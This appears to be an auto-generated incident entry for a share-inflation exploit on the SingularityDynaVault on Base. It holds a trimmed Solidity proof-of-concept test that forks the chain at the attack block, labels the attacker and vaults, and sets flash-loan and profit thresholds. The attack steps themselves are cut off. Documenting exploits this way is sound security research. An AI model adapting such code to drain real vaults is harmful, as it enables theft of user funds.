# [?] SingularityDynaVault - Oracle Misconfiguration / Share Inflation

## Summary
Severity: Unknown
Chain: Base
Component: SingularityDynaVault
Published: 2026-04-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/SingularityDynaVault_exp.sol
Type: defi-exploit-poc

## Details
Lost: 413.13K USDC

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    function setUp() public {
        uint256 forkBlock = 45_183_966;
        uint256 attackBlock = 45_183_967;
        uint256 attackTimestamp = 1_777_157_281;

        vm.createSelectFork("base", forkBlock);
        vm.roll(attackBlock);
        vm.warp(attackTimestamp);

        fundingToken = USDC_TOKEN;
        attacker = PROFIT_RECEIVER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(PROFIT_RECEIVER, "Profit Receiver");
        vm.label(DYNA_VAULT, "dynBaseUSDCv3");
        vm.label(MORPHO, "Morpho");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(ZERO_LIQUIDITY_VAULT_A, "Redeemed Vault Token A");
        vm.label(META_MORPHO_VAULT_A, "MetaMorpho Vault A");
        vm.label(META_MORPHO_VAULT_B, "MetaMorpho Vault B");
        vm.label(META_MORPHO_VAULT_C, "MetaMorpho Vault C");
        vm.label(RESIDUAL_VAULT_TOKEN, "Residual Vault Token");
    }

    function testExploit() public balanceLog {
        uint256 flashAmount = 100_000_000_000;
        uint256 minUsdcProfit = 300_000_000_000;
        uint256 inflatedShareFloor = 420_000 ether;
        uint256 usdcProfitFloor = 413_000_000_000;
        uint256 residualMetaVaultFloor = 31_000 ether;
        uint256 receiverUsdcBefore = usdc.balanceOf(PROFIT_RECEIVER);
        uint256 receiverMetaVaultBefore = IERC20(META_MORPHO_VAULT_A).balanceOf(PROFIT_RECEIVER);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/SingularityDynaVault_exp.sol_
